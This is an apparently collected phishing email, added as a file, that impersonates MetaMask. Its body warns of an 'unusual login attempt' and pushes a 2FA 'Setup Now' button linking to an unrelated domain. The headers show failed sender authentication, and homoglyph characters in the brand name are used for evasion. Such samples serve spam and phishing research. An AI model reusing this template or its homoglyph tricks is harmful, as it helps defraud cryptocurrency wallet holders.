@@ -1,0 +1,70 @@
+Return-Path: <postmaster@1845606180.nxcli.io>
+Received: from cloudhost-3769098.us-west-1.nxcli.net (cloudhost-3769098.us-west-1.nxcli.net [173.249.147.80])
+ by inbound-smtp.us-east-2.amazonaws.com with SMTP id issaonlg6rau07satbahebk8aur1rekv1ihju081
+ for zingerpie@kfcreview.com;
+ Sun, 01 Jun 2025 00:40:09 +0000 (UTC)
+Received-SPF: none (spfCheck: 173.249.147.80 is neither permitted nor denied by domain of 1845606180.nxcli.io) client-ip=173.249.147.80; envelope-from=postmaster@1845606180.nxcli.io; helo=cloudhost-3769098.us-west-1.nxcli.net;
+Authentication-Results: amazonses.com;
+ spf=none (spfCheck: 173.249.147.80 is neither permitted nor denied by domain of 1845606180.nxcli.io) client-ip=173.249.147.80; envelope-from=postmaster@1845606180.nxcli.io; helo=cloudhost-3769098.us-west-1.nxcli.net;
+ dkim=permerror header.i=@1845606180.nxcli.io;
+ dmarc=none header.from=xru.io;
+X-SES-RECEIPT: AEFBQUFBQUFBQUFFRkRnUk9WWEVFS1cyT3M1bjVIN21vcWd0a3VPQVVMMG9UWG9ENGxtRnNDRWFEL0RqR0x6SWRRUEZvQTBBRWFvU2lRcm9zRFpMbUtxdC9QaEUvWUJlekVzR0RTZHJQTGFsdEI2bElZZjI0ZGh6N0JqZUVPMkhwdmxoQXMyMmJlcHZvMFFwWXUzSTlDSkNNcmZPUEZMVjRDcDJsM3Y4SURWd0poTmRacWN2anBEN1VuNmtDak9lVnVwaTZUVVF6WXRaN0MzSUJVUG9RUEFBZ0ZpdkVJZWR5b3lRd1I0dFpvMEl5elJpZ3lMWlNUZEVkSEl5RkQ2bXRmVDdYNFNqK0FFTWMwYmZFdVdQUDBKSVpmN3BaNlVmQzFmTzJ0SlExdTIwSjBWYVY4UW94OGZDMm9jSFVUZG9tTURqMFd4U1NWZkE9
+X-SES-DKIM-SIGNATURE: a=rsa-sha256; q=dns/txt; b=LrlEN55f1hxs1ia4b8nsW7z2tik2t5nhgpQGzynKofg1jZ9sahUclU1veLvaoWhlLqcJ8sIHrvHwGBMkZcj7lUeSsfe5c8u85bWe2cGXLXzgFUS185riNLyQwI8k9IXKzXy0Q465Y8dayPkT8fqf8svaHOOwin8pGmXa3k5Br6A=; c=relaxed/simple; s=ndjes4mrtuzus6qxu3frw3ubo3gpjndv; d=amazonses.com; t=1748738410; v=1; bh=T0y0lk20EQ6826HyQWqC8Qud1jNwVB/QBzMyTwcHP7s=; h=From:To:Cc:Bcc:Subject:Date:Message-ID:MIME-Version:Content-Type:X-SES-RECEIPT;
+Comment: DomainKeys? See http://domainkeys.sourceforge.net/
+DomainKey-Signature: a=rsa-sha1; q=dns; c=nofws;
+  s=default; d=1845606180.nxcli.io;
+  b=aZijQOYrOG1GpTCetzoZsvNhZce1YvziISJ7c7PMHLwHxEPEsOtU1Z6KevXCb8n0IU3kQmK0rPhXt/5ngrzYm/3WMKRCjlOQ4PUKO8uoImJsri2ON2vmoWusWKg2SlyWK6wNn9aKhp8xouLDJa4cDGQVF79TQ8isVcLG76yPiE3Xngykl5e1UcU2bV99yBhJjs0Op3G4k+LP0m6WSCEvb15fwjujex2cwCc86mYAbM5uXps8Z/x2z9cs0y3tDFus1gZI3NYxHlQu2SiGI1gD4RuzbSJmN2jDsdIMI8lz4UtXcvEx5glX9+tTUsGlC1WBNAEVCpPj5v4d578j04sNOg==;
+  h=Received:Date:Message-ID:To:Subject:X-PHP-Originating-Script:From:Reply-To:MIME-Version:Content-Type:X-Mailer:X-Priority;
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed; d=1845606180.nxcli.io; h=
+	date:message-id:to:subject:from:reply-to:mime-version
+	:content-type; s=default; bh=T0y0lk20EQ6826HyQWqC8Qud1jNwVB/QBzM
+	yTwcHP7s=; b=GsXaNz2hS1PFdJwKJH+rjPRBmVEGr8nzfb2YL0QB8HklTnTucnf
+	xAYfo5TGiV2lEOuCAdVJd+Jfutl8RgQiYYxw997eEwHvvjuba2baSKmX3+7/5oBE
+	8NIiBFAjyUIYVRx6Rkwl/k4PcAFh/23Kfl6O+Q+evlw3Co8c6Bn3GV5w8/WRwIlq
+	vfQwm+FTv6QxEs4lwQ6PPo3osuej2l/r1rCyYJq/qQCyDGkARVJLMOlvlCTpWGZS
+	Ia3CaKabEu+Mp+xkrQrZBEyPs3ie6wsqKBtd6w+pCOv4EX+CRZ5h1y/VgHxWd53x
+	OhjxYH78zcy8Uqw2xejkVWzYwcDKKKfih5A==
+Received: (qmail 10225 invoked by uid 10203); 1 Jun 2025 00:31:22 +0000
+Date: 1 Jun 2025 00:31:22 +0000
+Message-ID: <20250601003122.10224.qmail@cloudhost-3769098.us-west-1.nxcli.net>
+To: zingerpie@kfcreview.com
+Subject: Lаst Reminder: Security Notification
+X-PHP-Originating-Script: 10203:f.php
+From: "MetaMаsk" <q2v9md08@xru.io>
+Reply-To: q2v9md08@xru.io
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+X-Mailer: PHP/8.2.20
+X-Priority: 3
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>MetaMаsk Security Notice</title>
+<style>
+  body {margin:0;padding:0;background:#f4f4f7;font-family:Arial,sans-serif;color:#333}
+  .box {max-width:500px;margin:40px auto;background:#fff;border-radius:8px;padding:24px 28px;box-shadow:0 2px 10px #0001}
+  .logo {font-size:38px;margin-bottom:10px;text-align:center}
+  h2 {color:#f6851b;text-align:center;font-size:20px;margin-bottom:20px}
+  p {font-size:15px;line-height:1.6;margin:0 0 18px;text-align:center}
+  .btn {
+    display:inline-block;margin:22px auto;padding:10px 24px;background:#f6851b;
+    color:#fff;text-decoration:none;border-radius:6px;font-weight:bold;font-size:15px
+  }
+  .footer {font-size:12px;color:#777;text-align:center;margin-top:26px}
+</style>
+</head>
+<body>
+<div class="box">
+  <div class="logo">🦊</div>
+  <h2>Unusual Login Attempt Detected</h2>
+  <p>We've detected activity from an unfamiliar device on your MetaMаsk wallet.</p>
+  <p>For your protection, we strongly recommend enabling Two-Factor Authentication (2FA).</p>
+  <p><a href="https://j2storagecontainers.com/cpe/?id=-8227712309925253793-8254" class="btn">🔐 Setup Now</a></p>
+  <p class="footer">If this was you, no action is needed.<br>— MetaMаsk Security Team</p>
+</div>
+</body>
+</html>
+
